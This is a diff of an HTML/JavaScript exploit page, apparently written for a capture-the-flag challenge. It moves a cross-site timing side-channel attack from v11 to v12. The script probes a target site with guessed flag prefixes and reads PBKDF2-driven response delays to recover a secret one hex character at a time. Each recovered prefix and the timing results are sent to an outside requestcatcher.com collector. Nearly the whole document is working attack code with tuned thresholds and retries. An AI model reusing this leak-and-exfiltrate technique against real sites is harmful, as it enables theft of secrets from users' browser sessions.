@@ -1,5 +1,5 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v11 - minimal exfil via requestcatcher, continue from verified prefix
+// v12 - verify prefix then find remaining chars with lower threshold + retries
 var T="https://svfgp.breakable.live";
 var W="https://h32enj12.requestcatcher.com";
 var known="CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f0b";
@@ -26,39 +26,73 @@ function probeOne(q){
       }
     }
     window.addEventListener("message",handler);
-    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},3500);
+    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},4000);
   });
 }
 
 function shuffle(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}
 
 async function run(){
-  exfil("v11_START_"+known);
+  exfil("v12_START");
   var t0=Date.now();
   await probeOne("ZZZZ"); // warmup
 
-  while(known.length < 4+64){
-    if(Date.now()-t0>53000){exfil("TIME_"+known);break;}
-    var chars=shuffle(HEX.split(""));
-    var hit=null;
-    await probeOne("ZZZZ"); // warmup each round
-    for(var i=0;i<chars.length;i++){
-      var ch=chars[i];
-      var t=await probeOne(known+ch);
-      if(t>280){
-        var t2=await probeOne(known+ch);
-        if(t2>250){hit=ch;break;}
-      }
-    }
-    if(!hit){
-      exfil("STUCK_"+known);
+  // Phase 1: verify current prefix by backing off until PBKDF2 triggers
+  var prefix=known;
+  while(prefix.length>4){
+    var t=await probeOne(prefix);
+    exfil("V_"+prefix.length+"="+t);
+    if(t>250){
+      exfil("VALID_AT_"+prefix.length);
       break;
     }
-    known+=hit;
-    // Only exfil every 4 chars to save requests
-    if((known.length-4)%4===0 || known.length===4+64){
-      exfil("F_"+known);
+    // This prefix doesn't trigger PBKDF2 - last char is wrong
+    prefix=prefix.slice(0,-1);
+  }
+  known=prefix;
+  exfil("VERIFIED_"+known);
+
+  // Phase 2: find remaining chars with lower threshold + 3 retries
+  while(known.length < 4+64){
+    if(Date.now()-t0>53000){exfil("TIME_"+known);break;}
+    await probeOne("ZZZZ"); // warmup
+    var chars=shuffle(HEX.split(""));
+    var hit=null;
+
+    // Try up to 3 full passes
+    for(var attempt=0;attempt<3 && !hit;attempt++){
+      chars=shuffle(HEX.split(""));
+      for(var i=0;i<chars.length;i++){
+        var ch=chars[i];
+        var t=await probeOne(known+ch);
+        if(t>230){ // lower threshold
+          var t2=await probeOne(known+ch);
+          if(t2>200){hit=ch;break;}
+        }
+      }
     }
+
+    if(!hit){
+      // Last resort: probe all, pick the slowest
+      var best={c:"",t:0};
+      chars=shuffle(HEX.split(""));
+      for(var i=0;i<chars.length;i++){
+        var t=await probeOne(known+chars[i]);
+        if(t>best.t)best={c:chars[i],t:t};
+      }
+      // Verify the best
+      var vt=await probeOne(known+best.c);
+      if(vt>180){
+        hit=best.c;
+        exfil("BEST_"+best.c+"="+best.t+",v="+vt);
+      } else {
+        exfil("STUCK_"+known);
+        break;
+      }
+    }
+
+    known+=hit;
+    exfil("F_"+known);
   }
 
   if(known.length===4+64)known+="}";
